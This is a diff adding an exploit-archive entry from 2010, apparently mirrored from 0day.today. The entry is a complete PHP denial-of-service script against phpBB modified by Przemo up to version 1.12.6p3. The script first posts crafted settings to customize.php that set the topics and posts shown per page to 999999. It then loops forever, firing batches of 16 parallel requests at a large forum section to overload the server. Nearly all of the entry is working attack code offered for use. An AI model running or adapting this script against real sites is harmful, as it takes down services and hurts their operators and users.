@@ -1,0 +1,136 @@
+id: 11867
+date: 04/18/2010
+title: phpBB modified by Przemo <= 1.12.6p3 Denial Of Service Exploit
+author: GLOBUS
+cves: 
+
+==============================================================
+phpBB modified by Przemo <= 1.12.6p3 Denial Of Service Exploit
+==============================================================
+
+<?php
+################################################################################
+# Exploit Title:         phpBB modified by Przemo <= 1.12.6p3 Denial Of Service Exploit
+#
+# Software               phpBB modified by Przemo 1.12.6p3
+# Date:                  2010-04-18
+# Author:                GLOBUS
+# Software Link:         http://www.przemo.org/phpBB2/
+# Version:               <= 1.12.6p3
+# category:              DoS
+#
+# Greetz:                hds, Neo, pok3, .xXx., j4ck, revel004
+################################################################################
+// cURL and PHP5
+
+
+
+if($argc !== 2)
+{
+	echo "#-------------------------------------------------------------------------\n";
+	echo "# phpBB modified by Przemo <= 1.12.6p3 Denial Of Service Exploit\n";
+	echo "# Author: GLOBUS\n";
+	echo "# Greetz: hds, Neo, pok3, .xXx., j4ck, revel004\n";
+	echo "#-------------------------------------------------------------------------\n";
+	echo "# php dos.php [URL]\n#\n";
+	echo "# php dos.php http://www.evil.pl/viewforum.php?f=1024\n#\n";
+	echo "# URL - Pelen adres do dzialu gdzie znajduje sie najwiecej tematow >1000\n";
+	echo "#-------------------------------------------------------------------------\n";
+	exit;
+}
+
+$url = $argv[1];
+$purl = substr($url, 0, strrpos($url, '/') + 1);
+
+$cookie = dirname(__FILE__) . '/tmp/cookie.txt';
+@mkdir(dirname($cookie), 0777, TRUE);
+@file_put_contents($cookie, '');
+
+if(!file_exists($cookie))
+{
+	echo "Can't Create File {$cookie}\n";
+	exit;
+}
+
+$headers = array
+(
+	'User-Agent: Opera/10.66 (Windows NT 5.1; U; ru) Presto/3.8.94 Version/10.66',
+	'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
+	'Accept-Language: ru,ru-RU;q=0.9,en;q=0.8',
+	'Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1'
+);
+
+$evilCookie = 'page_avatar=1&overlib=1&onmouse=1&shoutbox=1&user_allow_signature=1&user_showavatars=1&view_ignore_topics=1&topic_start_date=1&ctop=1&custom_rank=1&cagent=1&cignore=1&cquick=1&show_smiles=1&post_icon=1&user_topics_per_page=999999&user_posts_per_page=999999&user_hot_threshold=999999&dateformat=Y-m-d%2C+H%3Ai&user_sub_forum=1&user_split_cat=1&user_last_topic_title=1&user_sub_level_links=2&user_display_viewonline=2&submit=Wy%B6lij';
+
+$c = curl_init();
+
+$opts = array
+(
+	CURLOPT_URL			=> $purl . 'customize.php',
+	CURLOPT_HTTPHEADER		=> $headers,
+	CURLOPT_POST			=> 1,
+	CURLOPT_POSTFIELDS		=> $evilCookie,
+	CURLOPT_COOKIEFILE		=> $cookie,
+	CURLOPT_COOKIEJAR		=> $cookie,
+	CURLOPT_ENCODING		=> 'gzip, deflate',
+	CURLOPT_TIMEOUT			=> 10,
+	CURLOPT_RETURNTRANSFER		=> 1,
+);
+curl_setopt_array($c, $opts);
+
+curl_exec($c);
+curl_close($c);
+
+
+$c = array();
+
+while(TRUE)
+{
+	$mc = curl_multi_init();
+	for($i = 0; $i < 16; $i++)
+	{
+		$c[$i] = curl_init();
+
+		$opts = array
+		(
+			CURLOPT_URL			=> $url,
+			CURLOPT_HTTPHEADER		=> $headers,
+			CURLOPT_COOKIEFILE		=> $cookie,
+			CURLOPT_COOKIEJAR		=> $cookie,
+			CURLOPT_ENCODING		=> 'gzip, deflate',
+			CURLOPT_TIMEOUT			=> 4,
+			CURLOPT_RETURNTRANSFER		=> 1,
+		);
+		curl_setopt_array($c[$i], $opts);
+
+		curl_multi_add_handle($mc, $c[$i]);
+	}
+
+	$count = 0;
+	do
+	{
+		curl_multi_exec($mc, $resource);
+		usleep(50000);
+		$count++;
+		if($count > 60)
+		{
+			break;
+		}
+	}
+	while($resource > 0);
+
+	curl_multi_close($mc);
+
+	for($i = 0; $i < 20; $i++)
+	{
+		@curl_close($c[$i]);
+	}
+
+	echo '*';
+}
+
+?>
+
+
+
+#  0day.today [2023-03-24]  #
